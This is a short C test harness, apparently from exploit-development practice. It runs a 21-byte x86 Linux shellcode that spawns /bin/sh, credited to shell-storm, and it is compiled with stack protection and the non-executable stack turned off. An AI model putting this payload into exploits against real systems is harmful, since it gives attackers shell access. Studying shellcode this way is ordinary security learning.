#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main(int argc, char **argv){
	unsigned char shellcode[] = \
	"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
	//original:  http://shell-storm.org/shellcode/files/shellcode-841.php
	//gcc -m32 -fno-stack-protector -z execstack simple.c -o simple.elf
	
	// int (*FnPtr)() = (int(*)())argv[1];
	// FnPtr();

	(* (int(*)())shellcode)();  // same thing
}
